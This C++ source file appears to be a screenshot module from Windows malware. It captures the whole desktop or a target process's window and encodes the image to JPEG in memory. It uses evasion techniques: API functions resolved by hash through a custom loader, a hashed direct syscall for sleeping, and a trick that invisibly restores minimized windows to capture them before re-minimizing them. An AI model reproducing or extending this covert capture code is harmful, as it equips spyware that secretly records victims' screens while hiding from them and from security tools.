#include <Windows.h>
#include <gdiplus.h>
#include <Gdiplusflat.h>
#include <mem_ldr.h>
#include <hashtable.h>

typedef int (WINAPI* d_GdipDisposeImage)(void* image);
typedef int (WINAPI* d_GdipCreateBitmapFromHBITMAP)(HBITMAP hbm, HPALETTE hpal, void* bitmap);
typedef int (WINAPI* d_GdipSaveImageToStream)(void* image, IStream* stream, CLSID* clsidEncoder, PVOID);
typedef int (WINAPI* d_GdiplusStartup)(ULONG_PTR* upt, void* a, unsigned int b);
typedef void (WINAPI* d_GdiplusShutdown)(ULONG_PTR token);

void nt_sleep(int ms) {
	LARGE_INTEGER delay;
	LONGLONG llDelay = ms * 10000LL;
	delay.QuadPart = -llDelay;
	psyslib->nt_call_2arg(HASH_NtDelayExecution, 0, &delay);
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	LONG_PTR* params = (LONG_PTR*)lParam;
	DWORD targetPid = (DWORD)params[0];
	DWORD windowPid = 0;
	GetWindowThreadProcessId(hwnd, &windowPid);
	if (windowPid == targetPid && IsWindowVisible(hwnd)) {
		params[1] = (LONG_PTR)hwnd;
		return FALSE;
	}
	return TRUE;
}
HWND FindWindowByPID(DWORD pid)
{
	LONG_PTR params[2];
	params[0] = (LONG_PTR)pid;
	params[1] = 0;

	EnumWindows(EnumWindowsProc, (LPARAM)&params);
	return (HWND)params[1];
}

HBITMAP CaptureWindow(HWND hwnd, BOOL force)
{
	WINDOWPLACEMENT wp = { 0 };
	wp.length = sizeof(WINDOWPLACEMENT);
	if (!GetWindowPlacement(hwnd, &wp)) return NULL;
	RECT captureRect;
	int width, height;
	BOOL success = FALSE;
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = NULL;

	if (wp.showCmd == SW_SHOWMINIMIZED) {
		if (!force) goto cleanup;
		LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
		SetWindowLongA(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED | WS_EX_TOOLWINDOW);
		SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
		ShowWindow(hwnd, SW_RESTORE);
		UpdateWindow(hwnd);
		nt_sleep(500);

		if (!GetWindowRect(hwnd, &captureRect)) goto cleanup;
		width = captureRect.right - captureRect.left;
		height = captureRect.bottom - captureRect.top;
		if (width <= 0 || height <= 0) goto cleanup;
		hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
		if (!hBitmap) goto cleanup;
		SelectObject(hdcMem, hBitmap);
		success = PrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
		if (!success) {
			success = BitBlt(hdcMem, 0, 0, width, height, hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
		}
		ShowWindow(hwnd, SW_MINIMIZE);
		SetWindowLongA(hwnd, GWL_EXSTYLE, exStyle);
		SetWindowPos(hwnd, NULL, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
	}
	else {
		if (!GetWindowRect(hwnd, &captureRect)) goto cleanup;

		width = captureRect.right - captureRect.left;
		height = captureRect.bottom - captureRect.top;
		if (width <= 0 || height <= 0) {
			goto cleanup;
		}
		hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
		if (!hBitmap) goto cleanup;
		SelectObject(hdcMem, hBitmap);

		success = PrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
		if (!success) {
			success = BitBlt(hdcMem, 0, 0, width, height,
				hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
		}
	}

cleanup:
	if (hdcMem) DeleteDC(hdcMem);
	if (hdcScreen) ReleaseDC(NULL, hdcScreen);
	if (!success) {
		if (hBitmap) DeleteObject(hBitmap);
		return NULL;
	}
	return hBitmap;
}
BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSize)
{
	using namespace Gdiplus;
	static d_GdipDisposeImage GdipDisposeImage;
	static d_GdipSaveImageToStream GdipSaveImageToStream;
	static d_GdipCreateBitmapFromHBITMAP GdipCreateBitmapFromHBITMAP;
	static d_GdiplusStartup GdiplusStartup;
	static d_GdiplusShutdown GdiplusShutdown;

	PUCHAR gdip = (PUCHAR)LoadLibraryW(L"gdiplus.dll");
	GdipCreateBitmapFromHBITMAP = (d_GdipCreateBitmapFromHBITMAP)MemoryGetProcAddressP(gdip, HASH_GdipCreateBitmapFromHBITMAP);
	GdipSaveImageToStream = (d_GdipSaveImageToStream)MemoryGetProcAddressP(gdip, HASH_GdipSaveImageToStream);
	GdipDisposeImage = (d_GdipDisposeImage)MemoryGetProcAddressP(gdip, HASH_GdipDisposeImage);
	GdiplusStartup = (d_GdiplusStartup)MemoryGetProcAddressP(gdip, HASH_GdiplusStartup);
	GdiplusShutdown = (d_GdiplusShutdown)MemoryGetProcAddressP(gdip, HASH_GdiplusShutdown);

	GdiplusStartupInput gdiplusStartupInput;
	gdiplusStartupInput.GdiplusVersion = 1;
	gdiplusStartupInput.DebugEventCallback = NULL;
	gdiplusStartupInput.SuppressBackgroundThread = FALSE;
	gdiplusStartupInput.SuppressExternalCodecs = FALSE;

	ULONG_PTR gdiplusToken = 0;
	Status stat = (Status)GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	if (stat != Ok) {
		return FALSE;
	}
	GpBitmap* GpBitmap = NULL;

	stat = (Status)GdipCreateBitmapFromHBITMAP(hBitmap, NULL, &GpBitmap);
	if (stat != Ok) {
		GdiplusShutdown(gdiplusToken);
		return FALSE;
	}
	IStream* pStream = NULL;
	if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK) {
		GdipDisposeImage((GpImage*)GpBitmap);
		GdiplusShutdown(gdiplusToken);
		return FALSE;
	}

	EncoderParameters encoderParams;
	encoderParams.Count = 1;
	CLSID clsidEncoderQuality = { 0x1d5be4b5, 0xfa4a, 0x452d, {0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb} };
	encoderParams.Parameter[0].Guid = clsidEncoderQuality;
	encoderParams.Parameter[0].NumberOfValues = 1;
	encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
	encoderParams.Parameter[0].Value = &quality;

	CLSID clsidJPEG = { 0x557cf401, 0x1a04, 0x11d3, {0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e} };

	stat = (Status)GdipSaveImageToStream((GpImage*)GpBitmap, pStream, &clsidJPEG, &encoderParams);
	if (stat != Ok) {
		pStream->Release();
		GdipDisposeImage((GpImage*)GpBitmap);
		GdiplusShutdown(gdiplusToken);
		return FALSE;
	}

	LARGE_INTEGER liZero = { 0 };
	ULARGE_INTEGER uliSize = { 0 };
	if (pStream->Seek(liZero, STREAM_SEEK_END, &uliSize) != S_OK) {

		pStream->Release();
		GdipDisposeImage((GpImage*)GpBitmap);
		GdiplusShutdown(gdiplusToken);
		return FALSE;
	}

	*pJpegSize = (DWORD)uliSize.QuadPart;
	*pJpegData = (BYTE*)HeapAlloc(NtCurrentPeb()->ProcessHeap, 0, *pJpegSize);
	if (!*pJpegData) {
		pStream->Release();
		GdipDisposeImage((GpImage*)GpBitmap);
		GdiplusShutdown(gdiplusToken);
		return FALSE;
	}

	if (pStream->Seek(liZero, STREAM_SEEK_SET, NULL) != S_OK) {
		HeapFree(NtCurrentPeb()->ProcessHeap, 0, *pJpegData);
		pStream->Release();
		GdipDisposeImage((GpImage*)GpBitmap);
		GdiplusShutdown(gdiplusToken);
		return FALSE;
	}

	ULONG bytesRead = 0;
	if (pStream->Read(*pJpegData, *pJpegSize, &bytesRead) != S_OK || bytesRead != *pJpegSize) {
		HeapFree(NtCurrentPeb()->ProcessHeap, 0, *pJpegData);
		pStream->Release();
		GdipDisposeImage((GpImage*)GpBitmap);
		GdiplusShutdown(gdiplusToken);
		return FALSE;
	}

	pStream->Release();
	GdipDisposeImage((GpImage*)GpBitmap);
	GdiplusShutdown(gdiplusToken);
	return TRUE;
}

HBITMAP CaptureFullScreen() {
	HBITMAP hBitmap;
	int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
	int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
	int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	HDC hScreen = GetDC(NULL);
	if (hScreen == NULL) {
		return NULL;
	}

	HDC hDC = CreateCompatibleDC(hScreen);
	if (hDC == NULL) {
		ReleaseDC(NULL, hScreen);
		return NULL;
	}
	hBitmap = CreateCompatibleBitmap(hScreen, w, h);
	if (!hBitmap) {
		ReleaseDC(NULL, hScreen);
		DeleteDC(hDC);
		return NULL;
	}

	HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
	BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
	SelectObject(hDC, old_obj);
	DeleteDC(hDC);
	ReleaseDC(NULL, hScreen);

	return hBitmap;
}